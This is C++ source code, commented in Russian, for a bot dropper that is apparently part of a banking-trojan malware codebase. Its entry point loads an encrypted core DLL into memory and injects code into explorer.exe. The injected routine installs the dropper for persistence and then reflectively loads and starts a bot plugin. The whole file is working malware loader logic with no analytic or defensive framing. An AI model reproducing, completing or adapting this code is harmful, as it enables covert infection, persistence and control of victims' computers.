#include <windows.h>

#pragma comment(linker, "/ENTRY:LoaderMain" )

#include "Source\MemoryDllLoader.h"
#include "Source\MemoryDLL.h"
#include "Source\LoaderUtils.h"

#include "CoreDllDef.h"



char  DropperName[MAX_PATH];  // Имя ехе стартующего файла
DWORD DropperPID = 0; // PID дропера бота


//  Подключаем DLL ядра
namespace CoreDll
{
	#include "CoreDllData.cpp"	
}



//---------------------------------------------------------------------
//  Функция запускает плагин
//---------------------------------------------------------------------
void StartBotPlug(LPVOID Buf)
{
	LPVOID Handle = MemoryLoadLibrary(Buf);
	if (Handle)
	{
		OutputDebugStringA("-------------------------------------Плагин запущен");
	}
}




//---------------------------------------------------------------------
//  Функция загрузки плагина
//---------------------------------------------------------------------
DWORD WINAPI ExplorerMainProc(LPVOID)
{
	// Загружаем dll 
	LPVOID Handle = MemoryLoadEncryptedLibrary(CoreDll::data);

	// Этап первый. Инсталируем ехе
	TInstall Install = (TInstall)MemoryGetProcAddress(Handle, COREDLL_INSTALL);
	if (Install)
	{
		Install(DropperName, FALSE, TRUE, DropperPID); 
	}
	
	// Загружаем плагин
	TLoadBotPlug LoadBP = (TLoadBotPlug)MemoryGetProcAddress(Handle, COREDLL_LOADBOTPLUG);
	TFreeBotPlug FreeBP = (TFreeBotPlug)MemoryGetProcAddress(Handle, COREDLL_FREEBOTPLUG);

	LPVOID PlugBuf;
	DWORD  Size;
	if (LoadBP  && LoadBP(&PlugBuf, &Size))
	{
		StartBotPlug(PlugBuf);

		if (FreeBP) FreeBP(PlugBuf);
	}



	// Выгружаем длл ядра
	MemoryFreeLibrary(Handle);

	return 0;
}




//---------------------------------------------------------------------
//  Основная функция txe  
//---------------------------------------------------------------------
int APIENTRY LoaderMain() 
{
	// Получаем имя дропера
	DropperPID = GetCurrentProcessId();
	GetModuleFileNameA(NULL, DropperName, MAX_PATH);


	// Загружаем библиотеку 
	LPVOID Handle = MemoryLoadEncryptedLibrary(CoreDll::data);

	LPVOID Proc = MemoryGetProcAddress(Handle, COREDLL_INJECTINTOEXPLORER);

	// Инжектимя в explorer.exe
	if (Proc)
		(TInjectIntoExplorer(Proc))(ExplorerMainProc);
	

	MemoryFreeLibrary(Handle);


	ExitProcess(0);
	return 0;
}



